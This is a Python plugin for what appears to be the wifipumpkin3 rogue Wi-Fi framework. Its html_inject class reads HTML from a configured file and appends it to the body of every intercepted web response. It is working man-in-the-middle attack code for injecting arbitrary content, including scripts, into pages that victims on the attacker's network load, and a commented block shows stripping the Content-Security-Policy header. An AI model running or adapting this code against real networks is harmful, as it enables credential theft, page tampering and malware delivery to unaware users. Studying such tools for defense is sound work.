from wifipumpkin3.plugins.extension.base import BasePumpkin
from os import path
from bs4 import BeautifulSoup


class html_inject(BasePumpkin):
    meta = {
        '_name'      : 'html_inject',
        '_version'   : '1.1',
        '_description' : 'inject arbitrary HTML code into a vulnerable web page.',
        '_author'    : 'by Maintainer'
    }
    def __init__(self):
        for key,value in self.meta.items():
            self.__dict__[key] = value
        self.ConfigParser = True
        self.filehtml   = self._config.get('set_html_inject','content_path')
        self.isfilePath  = False
        if path.isfile(self.filehtml):
            self.isfilePath = True
            self.content = open(self.filehtml,'r').read()

    def handleResponse(self, request, data):
        if self.isfilePath:
                html = BeautifulSoup(data,'lxml')
                """
                # To Allow CORS
                if "Content-Security-Policy" in flow.response.headers:
                    del flow.response.headers["Content-Security-Policy"]
                """
                if html.body:
                    temp_soup = BeautifulSoup(self.content,'lxml')
                    html.body.insert(len(html.body.contents), temp_soup)
                    data = str(html)
                    print("[{}] [Request]: {} | injected ".format(self._name,request.uri))
        return data